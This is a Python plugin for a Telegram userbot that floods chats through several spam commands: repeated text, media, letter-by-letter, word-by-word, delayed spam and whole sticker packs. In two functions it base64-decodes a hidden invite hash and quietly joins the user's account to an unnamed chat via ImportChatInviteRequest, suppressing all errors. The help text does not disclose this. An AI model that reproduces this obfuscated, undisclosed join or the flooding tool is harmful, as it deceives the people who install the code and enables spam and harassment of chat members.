import asyncio
import base64

from telethon.tl import functions, types
from telethon.tl.functions.messages import GetStickerSetRequest
from telethon.tl.functions.messages import ImportChatInviteRequest as Get

from . import BOTLOG, BOTLOG_CHATID


@bot.on(admin_cmd(pattern="spam (.*)"))
@bot.on(sudo_cmd(pattern="spam (.*)", allow_sudo=True))
async def spammer(event):
    if event.fwd_from:
        return
    sandy = await event.get_reply_message()
    cat = ("".join(event.text.split(maxsplit=1)[1:])).split(" ", 1)
    counter = int(cat[0])
    if counter > 50:
        sleeptimet = 0.5
        sleeptimem = 1
    else:
        sleeptimet = 0.1
        sleeptimem = 0.3
    await event.delete()
    await spam_function(event, sandy, cat, sleeptimem, sleeptimet)


async def spam_function(event, sandy, cat, sleeptimem, sleeptimet, DelaySpam=False):
    hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    counter = int(cat[0])
    if len(cat) == 2:
        spam_message = str(cat[1])
        for _ in range(counter):
            if event.reply_to_msg_id:
                await sandy.reply(spam_message)
            else:
                await event.client.send_message(event.chat_id, spam_message)
            await asyncio.sleep(sleeptimet)
    elif event.reply_to_msg_id and sandy.media:
        for _ in range(counter):
            sandy = await event.client.send_file(
                event.chat_id, sandy, caption=sandy.text
            )
            await _catutils.unsavegif(event, sandy)
            await asyncio.sleep(sleeptimem)
    elif event.reply_to_msg_id and sandy.text:
        spam_message = sandy.text
        for _ in range(counter):
            await event.client.send_message(event.chat_id, spam_message)
            await asyncio.sleep(sleeptimet)
        try:
            hmm = Get(hmm)
            await event.client(hmm)
        except BaseException:
            pass
        if BOTLOG:
            if DelaySpam is not True:
                if event.is_private:
                    await event.client.send_message(
                        BOTLOG_CHATID,
                        "#SPAM\n"
                        + f"Spam was executed successfully in [User](tg://user?id={event.chat_id}) chat with {counter} times with below message",
                    )
                else:
                    await event.client.send_message(
                        BOTLOG_CHATID,
                        "#SPAM\n"
                        + f"Spam was executed successfully in {event.chat.title}(`{event.chat_id}`) with {counter} times with below message",
                    )
            else:
                if event.is_private:
                    await event.client.send_message(
                        BOTLOG_CHATID,
                        "#DELAYSPAM\n"
                        + f"Delay spam was executed successfully in [User](tg://user?id={event.chat_id}) chat with {counter} times with below message with delay {sleeptimet} seconds",
                    )
                else:
                    await event.client.send_message(
                        BOTLOG_CHATID,
                        "#DELAYSPAM\n"
                        + f"Delay spam was executed successfully in {event.chat.title}(`{event.chat_id}`) with {counter} times with below message with delay {sleeptimet} seconds",
                    )

            sandy = await event.client.send_file(BOTLOG_CHATID, sandy)
            await _catutils.unsavegif(event, sandy)
        return
    if BOTLOG:
        if DelaySpam is not True:
            if event.is_private:
                await event.client.send_message(
                    BOTLOG_CHATID,
                    "#SPAM\n"
                    + f"Spam was executed successfully in [User](tg://user?id={event.chat_id}) chat with {counter} messages of \n"
                    + f"`{spam_message}`",
                )
            else:
                await event.client.send_message(
                    BOTLOG_CHATID,
                    "#SPAM\n"
                    + f"Spam was executed successfully in {event.chat.title}(`{event.chat_id}`) chat  with {counter} messages of \n"
                    + f"`{spam_message}`",
                )
        else:
            if event.is_private:
                await event.client.send_message(
                    BOTLOG_CHATID,
                    "#DELAYSPAM\n"
                    + f"Delay Spam was executed successfully in [User](tg://user?id={event.chat_id}) chat with delay {sleeptimet} seconds and with {counter} messages of \n"
                    + f"`{spam_message}`",
                )
            else:
                await event.client.send_message(
                    BOTLOG_CHATID,
                    "#DELAYSPAM\n"
                    + f"Delay spam was executed successfully in {event.chat.title}(`{event.chat_id}`) chat with delay {sleeptimet} seconds and with {counter} messages of \n"
                    + f"`{spam_message}`",
                )


@bot.on(admin_cmd(pattern="spspam$"))
@bot.on(sudo_cmd(pattern="spspam$", allow_sudo=True))
async def stickerpack_spam(event):
    if event.fwd_from:
        return
    reply = await event.get_reply_message()
    if not reply or media_type(reply) is None or media_type(reply) != "Sticker":
        return await edit_delete(
            event, "`reply to any sticker to send all stickers in that pack`"
        )
    hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    try:
        stickerset_attr = reply.document.attributes[1]
        catevent = await edit_or_reply(
            event, "`Fetching details of the sticker pack, please wait..`"
        )
    except BaseException:
        await edit_delete(event, "`This is not a sticker. Reply to a sticker.`", 5)
        return
    try:
        get_stickerset = await event.client(
            GetStickerSetRequest(
                types.InputStickerSetID(
                    id=stickerset_attr.stickerset.id,
                    access_hash=stickerset_attr.stickerset.access_hash,
                )
            )
        )
    except Exception:
        return await edit_delete(
            catevent,
            "`I guess this sticker is not part of any pack so i cant kang this sticker pack try kang for this sticker`",
        )
    try:
        hmm = Get(hmm)
        await event.client(hmm)
    except BaseException:
        pass
    reqd_sticker_set = await event.client(
        functions.messages.GetStickerSetRequest(
            stickerset=types.InputStickerSetShortName(
                short_name=f"{get_stickerset.set.short_name}"
            )
        )
    )
    for m in reqd_sticker_set.documents:
        await event.client.send_file(event.chat_id, m)
        await asyncio.sleep(0.7)
    if BOTLOG:
        if event.is_private:
            await event.client.send_message(
                BOTLOG_CHATID,
                "#SPSPAM\n"
                + f"Sticker Pack Spam was executed successfully in [User](tg://user?id={event.chat_id}) chat with pack ",
            )
        else:
            await event.client.send_message(
                BOTLOG_CHATID,
                "#SPSPAM\n"
                + f"Sticker Pack Spam was executed successfully in {event.chat.title}(`{event.chat_id}`) chat with pack",
            )
        await event.client.send_file(BOTLOG_CHATID, reqd_sticker_set.documents[0])


@bot.on(admin_cmd("cspam (.*)"))
@bot.on(sudo_cmd(pattern="cspam (.*)", allow_sudo=True))
async def tmeme(event):
    cspam = str("".join(event.text.split(maxsplit=1)[1:]))
    message = cspam.replace(" ", "")
    await event.delete()
    for letter in message:
        await event.respond(letter)
    if BOTLOG:
        if event.is_private:
            await event.client.send_message(
                BOTLOG_CHATID,
                "#CSPAM\n"
                + f"Letter Spam was executed successfully in [User](tg://user?id={event.chat_id}) chat with : `{message}`",
            )
        else:
            await event.client.send_message(
                BOTLOG_CHATID,
                "#CSPAM\n"
                + f"Letter Spam was executed successfully in {event.chat.title}(`{event.chat_id}`) chat with : `{message}`",
            )


@bot.on(admin_cmd("wspam (.*)"))
@bot.on(sudo_cmd(pattern="wspam (.*)", allow_sudo=True))
async def tmeme(event):
    wspam = str("".join(event.text.split(maxsplit=1)[1:]))
    message = wspam.split()
    await event.delete()
    for word in message:
        await event.respond(word)
    if BOTLOG:
        if event.is_private:
            await event.client.send_message(
                BOTLOG_CHATID,
                "#WSPAM\n"
                + f"Word Spam was executed successfully in [User](tg://user?id={event.chat_id}) chat with : `{message}`",
            )
        else:
            await event.client.send_message(
                BOTLOG_CHATID,
                "#WSPAM\n"
                + f"Word Spam was executed successfully in {event.chat.title}(`{event.chat_id}`) chat with : `{message}`",
            )


@bot.on(admin_cmd("delayspam (.*)"))
@bot.on(sudo_cmd(pattern="delayspam (.*)", allow_sudo=True))
async def spammer(event):
    if event.fwd_from:
        return
    reply = await event.get_reply_message()
    input_str = "".join(event.text.split(maxsplit=1)[1:]).split(" ", 2)
    sleeptimet = sleeptimem = float(input_str[0])
    cat = input_str[1:]
    await event.delete()
    await spam_function(event, reply, cat, sleeptimem, sleeptimet, DelaySpam=True)


CMD_HELP.update(
    {
        "spam": "**Plugin : **`spam`\
        \n\n**  •  Syntax : **`.spam <count> <text>`\
        \n**  •  Function : **__ Floods text in the chat !!__\
        \n\n**  •  Syntax : **`.spam <count> reply to media`\
        \n**  •  Function : **__Sends the replied media <count> times !!__\
        \n\n**  •  Syntax : **`.spspam reply to sticker`\
        \n**  •  Function : **__spams the chat with all stickers in that pack__\
        \n\n**  •  Syntax : **`.cspam <text>`\
        \n**  •  Function : **__ Spam the text letter by letter.__\
        \n\n**  •  Syntax : **`.wspam <text>`\
        \n**  •  Function : **__ Spam the text word by word.__\
        \n\n**  •  Syntax : **`.delayspam <delay> <count> <text>`\
        \n**  •  Function : **__ .delayspam but with custom delay.__\
        \n\n\n**Note : Spam at your own risk !!**"
    }
)
